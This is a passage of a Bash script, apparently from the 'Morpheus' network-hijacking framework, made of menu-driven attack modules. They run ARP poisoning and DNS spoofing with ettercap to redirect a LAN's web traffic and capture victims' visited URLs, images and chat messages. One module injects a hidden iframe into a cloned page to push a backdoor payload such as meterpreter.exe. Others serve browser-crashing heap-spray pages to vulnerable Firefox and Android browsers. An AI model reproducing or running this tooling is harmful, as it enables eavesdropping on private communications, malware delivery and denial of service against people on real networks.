  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft # backup
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# -----------------------------------------------
# REDIRECT TARGET TRAFIC TO GOOGLE SPHERE (prank)
# -----------------------------------------------
sh_stage5 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}      This module will redirect target browsing surfing under     ${BlueF}|"
echo "${BlueF}    | ${YellowF}       mitm attacks to google sphere website (google prank)       ${BlueF}|"
echo "${BlueF}    | ${YellowF}      'All [.com] domains will be redirected to mrdoob.com'       ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then
# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup
  cp $Edns /tmp/etter.dns # backup
  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb # backup
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
  sed -i "s|PrE|$PrEfI|g" etter.dns
  cp $IPATH/bin/etter.dns $Edns
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  # using SED bash command to config redirect.eft
  sed -i "s|IpAdR|http://mrdoob.com/projects/chromeexperiments/google-sphere/|g" $IPATH/filters/redirect.eft
  # copy files needed to apache2 webroot...
  cp -R $IPATH/bin/phishing/"Google Sphere_files" $ApachE
  cp $IPATH/bin/phishing/index.html $ApachE
  cd $IPATH
  sleep 1

# compiling packet_drop.eft to be used in ettercap
xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
sleep 1
xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/sphere_prank -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/sphere_prank -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
  rm $IPATH/output/redirect.ef
  mv /tmp/etter.dns $Edns
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft # backup
  rm -R $ApachE/"Google Sphere_files"
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# -----------------------------------------------
# CAPTURE TARGET BROWSING HISTORY [URL's VISITED]
# -----------------------------------------------
sh_stage6 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}  This module will capture target browsing surfing [url visited]  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  and display then with the help of urlsnarf, this module will    ${BlueF}|"
echo "${BlueF}    | ${YellowF}    also store urls visited into morpheus/logs/grab_hosts.log     ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then


ch=`which urlsnarf`
if [ "$ch" != "$UsNar" ]; then
echo ${RedF}[x]${white} msgsnarf utility not found${RedF}!${Reset};
sleep 1
echo ${RedF}[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
sleep 3
sh_exit
fi

# get user input to build filter
rm $IPATH/logs/grab_hosts.log
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/filters/grab_hosts.eft $IPATH/filters/grab_hosts.rb # backup
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/grab_hosts.eft
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} Compiling grab_hosts.eft${RedF}!${Reset};
  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/grab_hosts.eft -o $IPATH/output/grab_hosts.ef && sleep 3"
  sleep 1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
      echo ${RedF}  # webspy -i $InT3R $UpL
        xterm -T "browsing capture [press ctrl+c to exit]" -geometry 120x27 -e "urlsnarf -i $InT3R | cut -d '\"' -f4" & ettercap -T --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost// /$gateway//
      else
      echo ${RedF}
        xterm -T "browsing capture [press ctrl+c to exit]" -geometry 120x27 -e "urlsnarf -i $InT3R | cut -d '\"' -f4" & ettercap -T --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost/ /$gateway/
      fi


  # check if exist any reports
  dd=`ls $IPATH/logs`
  cd $IPATH/logs
  tr -cd '\11\12\15\40-\176' < grab_hosts.log > clean-file.log # remove non-ancii caracters
  mv clean-file.log grab_hosts.log
  if ! [ -z "$dd" ]; then
  # display captured brosing hitory to user
  HoSt=`cat $IPATH/logs/grab_hosts.log | grep "Host:"`
  echo ""
  echo "${white}Host:${YellowF} $UpL ${white}browsing history${RedF}!"
  echo "$HoSt"
  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
  fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft # backup
  rm $IPATH/output/grab_hosts.ef
  cd $IPATH
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# -------------------------------------------
# CAPTURE TARGET BROWSING PICTURES (DRIFTNET)
# -------------------------------------------
sh_stage7 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module will allow users to Capture images from target    ${BlueF}|"
echo "${BlueF}    | ${YellowF}          network traffic and display them in an X window.        ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF} HINT: morpheus will store the captured images into logs/capture  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  but it will delete the contents of capture folder in the end.   ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then


ch=`which driftnet`
if [ "$ch" != "$DrIn" ]; then
echo ${RedF}[x]${white} driftnet utility not found${RedF}!${Reset};
sleep 1
echo ${RedF}[x]${white} please Install:${RedF}driftnet${white} packet...${Reset};
sleep 3
sh_exit
fi

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  mkdir $IPATH/logs/capture
  sleep 1
  echo ${BlueF}[☠]${white} Folder: logs/capture build${RedF}!${Reset};
  sleep 1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
      echo ${RedF}  # webspy -i $InT3R $UpL
        driftnet -i $InT3R -d capture & ettercap -T --visual text -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
      else
      echo ${RedF}
        driftnet -i $InT3R -d capture & ettercap -T --visual text -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  rm -r $IPATH/logs/capture
  cd $IPATH
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}







# -----------------------------------------------------
# CAPTURE TARGET CHAT CONVERSATIONS [IRC,AOL,YAHOO,MSN]
# -----------------------------------------------------
sh_stage8 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} This module will capture target chat conversations in real time  ${BlueF}|"
echo "${BlueF}    | ${YellowF} of IRC,AOL,YAHOO,MSN,POP3 using msgsnarf as backend application  ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then


ch=`which msgsnarf`
if [ "$ch" != "$MsGnA" ]; then
echo ${RedF}[x]${white} msgsnarf utility not found${RedF}!${Reset};
sleep 1
echo ${RedF}[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
sleep 3
sh_exit
fi

# get user input to build filter
rm $IPATH/logs/chat_services.log
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/filters/chat_services.eft $IPATH/filters/chat_services.rb # backup
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/chat_services.eft
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} Compiling chat_services.eft${RedF}!${Reset};
  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/chat_services.eft -o $IPATH/output/chat_services.ef && sleep 3"
  sleep 1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
      echo ${RedF}  # webspy -i $InT3R $UpL
        xterm -T "chat/msg capture [press ctrl+c to exit]" -geometry 120x27 -e "msgsnarf -i $InT3R $UpL" & ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/chat_services.ef -M ARP /$rhost// /$gateway//
      else
      echo ${RedF}
        xterm -T "chat/msg capture [press ctrl+c to exit]" -geometry 120x27 -e "msgsnarf -i $InT3R $UpL" & ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/chat_services.ef -M ARP /$rhost/ /$gateway/
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft # backup
  rm $IPATH/output/chat_services.ef
  cd $IPATH
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# --------------------------------------------------------
# CLONE WEBSITE AND INJECT BACKDOOR ON </BODY><IFRAME> TAG
# --------------------------------------------------------
sh_stage9 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module will embbeded your payload into a fake webpage    ${BlueF}|"
echo "${BlueF}    | ${YellowF}     and delivers it using mitm+dns_spoof (trigger download)      ${BlueF}|"
echo "${BlueF}    | ${YellowF}    'All [.com] domains will be redirected to the fake webpage'   ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-selection --text "chose payload to be uploded\nexample:meterpreter.exe")

echo ${BlueF}[☠]${white} Parsing agent filename data ..${Reset};
sleep 2
echo "$UpL" > test.txt
dIc=`grep -oE '[^/]+$' test.txt` # payload.exe
rm test.txt


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns # backup
  # using bash SED to inject our malicious <iframe>
  cd phishing
  sed "s|<\/body>|<iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://$IP/$dIc\"><\/iframe><\/body>|" clone.html > clone2.html
  # copy files to apache2 webroot
  mv clone2.html $ApachE/index.html
  cp miss.png $ApachE
  cp $UpL $ApachE
  rm clone2.html
  cd ..
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$IP|g" etter.dns
  sed -i "s|PrE|$PrEfI|g" etter.dns
  cp $IPATH/bin/etter.dns $Edns
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1


# IF NOT EXIST FILE IN APACHE, ABORT..
if ! [ -e $ApachE/$dIc ]; then
echo ${RedF}[x]${white} Backdoor:${RedF}$dIc ${white}not found...${Reset};
sleep 3
cd $ApachE
rm *.exe
rm $ApachE/miss.png
cd $IPATH
sh_exit # jump to exit ...
fi

echo ${BlueF}[☠]${white} Found:${GreenF}$dIc${RedF}!${Reset};
sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/clone_creds -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/clone_creds -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
  mv /tmp/etter.dns $Edns
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
  rm $ApachE/miss.png
  rm $ApachE/$dIc
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# ----------------------------------------------------
# FIREFOX =< 49.0.1 DENIAL-OF-SERVICE [mitm+dns_spoof]
# ----------------------------------------------------
sh_stage10 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} This module will crash target mozilla firefox (=< 49.0.1) using  ${BlueF}|"
echo "${BlueF}    | ${YellowF} a Heap Spray writen in javascript (deliver under mitm+dns_spoof) ${BlueF}|"
echo "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
echo "${BlueF}    | ${YellowF}  2 - If firefox version its exploitable then deliver payload.    ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/UserAgent.log
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns # backup
  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb # backup
  # copy files to apache2 webroot
  cp $IPATH/bin/phishing/Firefox-D0S-49.0.1.html $ApachE/index.html
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft
  sed -i "s|TaRgEt|$IP|g" etter.dns
  sed -i "s|PrE|$PrEfI|g" etter.dns
  cp $IPATH/bin/etter.dns $Edns
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
  sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
      else
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
      fi

  cd $IPATH/logs
  # display captured user-agent strings to user
  # User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
  nOn="49" # above versions are patched (official release its 51.0.1)...
  tr -cd '\11\12\15\40-\176' < UserAgent.log > clean-file.log # remove non-ancii caracters
  mv clean-file.log UserAgent.log
  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}`
  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}`
  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}`
  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent" | cut -d 'F' -f2 | cut -d '/' -f2 | cut -d '.' -f1`
  echo "${GreenF}    $HoSt"
  sleep 1
  echo "${GreenF}    $AcLa"
  sleep 1
  echo "${GreenF}    $DisP"
  sleep 1

cd $IPATH
# check if target system its vulnerable (firefox version)
if [ "$VeVul" \> "$nOn" ]; then
echo "${GreenF}    Browser report:${RedF} not vulnerable...${BlueF}"
sleep 3
echo "${RedF}[x] warning: running against a non-compatible target!"
sleep 1
else
echo "${GreenF}    Browser report: vulnerable...${BlueF}"
sleep 3
fi

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
  mv /tmp/etter.dns $Edns
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft # backup
  rm $IPATH/output/UserAgent.ef
  rm $ApachE/index.html
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------------------------
# ANDROID BROWSER DENIAL-OF-SERVICE [mitm+dns_spoof]
# --------------------------------------------------
sh_stage11 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module will crash target android browser by using a      ${BlueF}|"
echo "${BlueF}    | ${YellowF}   Heap Spray writen in javascript (deliver under mitm+dns_spoof) ${BlueF}|"
echo "${BlueF}    | ${YellowF}   'All [.com] domains will be redirected to the exploit webpage' ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}   1 - Capture a tcp/udp packet from target host to verify vuln   ${BlueF}|"
echo "${BlueF}    | ${YellowF}   2 - If browser version its exploitable then deliver payload.   ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/UserAgent.log
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns # backup
  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb # backup
  # copy files to apache2 webroot
  cp $IPATH/bin/phishing/Android-DOS-4.0.3.html $ApachE/index.html
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft
  sed -i "s|TaRgEt|$IP|g" etter.dns
  sed -i "s|PrE|$PrEfI|g" etter.dns
  cp $IPATH/bin/etter.dns $Edns
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
  sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
      else
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
      fi

  cd $IPATH/logs
  # display captured user-agent strings to user
  # Mozilla/5.0 (Linux; Android 6.0.1; VFD 600 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89
  # Mozilla/5.0 (Linux; U; Android 4.0.3; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30
  nOn="Android"
  tr -cd '\11\12\15\40-\176' < UserAgent.log > clean-file.log # remove non-ancii caracters
  mv clean-file.log UserAgent.log
  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}`
